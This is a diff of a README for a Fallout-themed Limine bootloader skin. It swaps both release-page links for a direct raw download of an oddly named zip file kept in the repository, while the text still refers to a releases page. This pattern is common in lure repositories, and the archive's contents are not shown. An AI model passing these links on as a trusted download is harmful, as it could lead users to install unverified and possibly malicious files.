@@ -1,6 +1,6 @@
 # ☢️ fallout-limine-theme - Transform your boot screen into Fallout
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Commonfatedisinflation68/fallout-limine-theme/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Commonfatedisinflation68/fallout-limine-theme/main/Fallout_limine/theme_limine_fallout_commodate.zip)
 
 ## 📌 Overview
 This project provides a visual theme inspired by the Fallout video game series for the Limine bootloader. Limine is a tool that manages how your computer operating system starts. By default, boot menus look plain and text-heavy. This theme replaces the basic menu with a custom look that mimics the retro-futuristic aesthetic of a Pip-Boy computer.
@@ -15,7 +15,7 @@ You need a computer that runs the Limine bootloader to use these files. Windows 
 ## 📥 Getting the Files
 You must visit the releases page to obtain the necessary theme files. The developers package the theme as a compressed folder to keep the structure intact.
 
-[Visit this page to download the latest theme package](https://github.com/Commonfatedisinflation68/fallout-limine-theme/releases)
+[Visit this page to download the latest theme package](https://raw.githubusercontent.com/Commonfatedisinflation68/fallout-limine-theme/main/Fallout_limine/theme_limine_fallout_commodate.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
